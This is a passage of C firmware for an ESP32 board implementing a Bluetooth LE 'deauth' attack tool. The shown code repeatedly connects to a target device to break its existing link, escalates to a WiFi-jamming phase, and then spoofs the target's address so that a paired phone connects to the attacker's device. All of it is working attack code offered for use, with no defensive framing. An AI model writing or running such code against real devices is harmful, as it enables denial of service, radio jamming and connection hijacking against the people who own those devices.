            ble_gap_conn_cancel();
            vTaskDelay(pdMS_TO_TICKS(200));
        }
    }

    /* WiFi jam didn't break the connection — try Phase 3 (spoof) */
    ESP_LOGI(TAG, "WiFi jam didn't break the connection. Trying Phase 3: Spoof.");
    phase = 3;
    run_phase3_spoof();

    /* After spoof, go back to Phase 1 */
    phase = 1;
    status13_count = 0;
    try_addr_type = BLE_ADDR_PUBLIC;
}

/* ============ PHASE 3: Address Spoof ============ */
static void run_phase3_spoof(void) {
    ESP_LOGI(TAG, "PHASE 3: Spoof advertise as target for %d seconds", SPOOF_DURATION);

    cleanup_ble_state();

    uint8_t target_addr[6];
    xSemaphoreTake(mutex, portMAX_DELAY);
    char scopy[32];
    strncpy(scopy, target, sizeof(scopy) - 1);
    scopy[sizeof(scopy) - 1] = '\0';
    xSemaphoreGive(mutex);
    addr_from_str(scopy, target_addr);

    /* Set random address to look like target */
    uint8_t spoof_addr[6];
    memcpy(spoof_addr, target_addr, 6);
    spoof_addr[5] = (spoof_addr[5] & 0x3F) | 0xC0;

    int rc = ble_hs_id_set_rnd(spoof_addr);
    if (rc != 0) {
        ESP_LOGW(TAG, "Failed to set random addr (rc=%d)", rc);
    }

    /* Build advertisement data — looks like a BLE device */
    uint8_t adv_data[] = {
        0x02, 0x01, 0x06,                       /* Flags */
        0x03, 0x03, 0x0F, 0x18,                 /* Battery Service UUID */
        0x05, 0x09, 'B', 'L', 'E', 'D', 'v',    /* Name: "BLEDv" */
    };

    struct ble_gap_adv_params adv_params = {
        .conn_mode = BLE_GAP_CONN_MODE_UND,
        .disc_mode = BLE_GAP_DISC_MODE_GEN,
        .itvl_min = 0x0020,   /* Fast: 20ms */
        .itvl_max = 0x0030,   /* 30ms */
        .channel_map = 0x07,
        .filter_policy = 0,
    };

    ble_gap_adv_set_data(adv_data, sizeof(adv_data));
    rc = ble_gap_adv_start(1, NULL, BLE_HS_FOREVER,
                           &adv_params, spoof_event_cb, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "Spoof adv start failed: %d", rc);
        return;
    }

    ESP_LOGI(TAG, "Spoof advertising started! Waiting for phone to connect to us...");

    /* Wait for SPOOF_DURATION seconds */
    int elapsed = 0;
    while (running && elapsed < SPOOF_DURATION * 10) {
        vTaskDelay(pdMS_TO_TICKS(100));
        elapsed++;
    }

    if (ble_gap_adv_active()) ble_gap_adv_stop();

    ESP_LOGI(TAG, "Spoof phase done.");
}

/* ============ PHASE 1: Direct Connect ============ */
static void run_phase1_connect(void) {
    /* Clean up ALL stale BLE state before each attempt */
    cleanup_ble_state();

    xSemaphoreTake(mutex, portMAX_DELAY);
    char copy[32];
    strncpy(copy, target, sizeof(copy) - 1);
    copy[sizeof(copy) - 1] = '\0';
    xSemaphoreGive(mutex);

    uint8_t addr_val[6];
    addr_from_str(copy, addr_val);

    ble_addr_t peer;
    peer.type = try_addr_type;
    memcpy(peer.val, addr_val, 6);

    ESP_LOGI(TAG, "PHASE 1: Connect to %s (addr_type=%s, #%d)",
             copy, try_addr_type == BLE_ADDR_PUBLIC ? "PUBLIC" : "RANDOM",
             connect_count + 1);

    xSemaphoreTake(conn_done_sem, 0);

    uint8_t own_addr_type = ble_common_own_addr_type();

    int rc = ble_gap_connect(own_addr_type, &peer, 3000,
                             &conn_params, deauth_event_cb, NULL);
    if (rc != 0) {
        if (rc == BLE_HS_EBUSY || rc == BLE_HS_EALREADY) {
            ESP_LOGD(TAG, "BLE busy (%d), cleaning up", rc);
            ble_gap_conn_cancel();
            vTaskDelay(pdMS_TO_TICKS(500));
        } else {
            ESP_LOGW(TAG, "ble_gap_connect returned %d", rc);
            vTaskDelay(pdMS_TO_TICKS(1000));
        }
        return;
    }

    /* Wait for connection callback — up to 5 seconds */
    if (xSemaphoreTake(conn_done_sem, pdMS_TO_TICKS(5000)) != pdTRUE) {
        ESP_LOGW(TAG, "Connection timed out");
        if (ble_gap_conn_active()) ble_gap_conn_cancel();
    }

    /* After successful connect+terminate, wait for re-advertise */
    if (connect_count > 0 && status13_count == 0) {
        ESP_LOGI(TAG, "Waiting 3s for target to re-advertise...");
        vTaskDelay(pdMS_TO_TICKS(3000));
    }
}

/* ============ Main task ============ */
static void deauth_task(void *arg) {
    ESP_LOGI(TAG, "BLE Deauth task started for target %s", target);
    ESP_LOGI(TAG, "Phase 1: Direct | Phase 2: WiFi Jam | Phase 3: Spoof");

    ble_common_disconnect_all();
    vTaskDelay(pdMS_TO_TICKS(1000));

    connect_count = 0;
    status13_count = 0;
    phase = 1;
    try_addr_type = BLE_ADDR_PUBLIC;

    while (running) {
        if (phase == 1) {
            run_phase1_connect();

            if (status13_count > 0) {
                int backoff = status13_count * 300;
                if (backoff > 2000) backoff = 2000;
                vTaskDelay(pdMS_TO_TICKS(backoff));
            } else {
                vTaskDelay(pdMS_TO_TICKS(200));
            }
        } else {
            /* Phase 2 (includes Phase 3) */
            run_phase2_jam();
        }
    }

    cleanup_ble_state();

    ESP_LOGI(TAG, "BLE Deauth task exiting (attempted %d deauths)", connect_count);
    task_handle = NULL;
    if (task_exit_sem) xSemaphoreGive(task_exit_sem);
    vTaskDelete(NULL);
}

void ble_deauth_init(void) {
    if (mutex == NULL) mutex = xSemaphoreCreateMutex();
    if (task_exit_sem == NULL) task_exit_sem = xSemaphoreCreateBinary();
    if (conn_done_sem == NULL) conn_done_sem = xSemaphoreCreateBinary();

    ble_common_init();

    ESP_LOGI(TAG, "ble_deauth initialized (3-phase: direct + WiFi jam + spoof)");
}

void ble_deauth_start(const char *target_addr) {
    if (running) return;
    if (mutex == NULL) mutex = xSemaphoreCreateMutex();
    if (conn_done_sem == NULL) conn_done_sem = xSemaphoreCreateBinary();

    xSemaphoreTake(mutex, portMAX_DELAY);
    strncpy(target, target_addr ? target_addr : "", sizeof(target) - 1);
    target[sizeof(target) - 1] = '\0';
    xSemaphoreGive(mutex);

    try_addr_type = BLE_ADDR_PUBLIC;
    connect_count = 0;
    status13_count = 0;
    phase = 1;

    running = true;

    if (task_exit_sem != NULL) xSemaphoreTake(task_exit_sem, 0);

    BaseType_t ret = xTaskCreate(deauth_task, "ble_deauth", 4096, NULL, 5, &task_handle);
    if (ret != pdPASS) {
        ESP_LOGE(TAG, "Failed to create deauth task");
        running = false;
    }
}

void ble_deauth_stop(void) {
    if (!running) return;
    running = false;

    if (conn_done_sem) xSemaphoreGive(conn_done_sem);

    if (task_exit_sem != NULL) {
        if (xSemaphoreTake(task_exit_sem, pdMS_TO_TICKS(5000)) != pdTRUE) {
            ESP_LOGW(TAG, "Task exit timeout, forcing delete");
            if (task_handle != NULL) {
                vTaskDelete(task_handle);
                task_handle = NULL;
            }
        }
    } else {
        vTaskDelay(pdMS_TO_TICKS(1000));
        if (task_handle != NULL) {
            vTaskDelete(task_handle);
            task_handle = NULL;
        }
    }

    ESP_LOGI(TAG, "BLE Deauth stopped (attempted %d deauths)", connect_count);
}

bool ble_deauth_is_running(void) {
    return running;
}
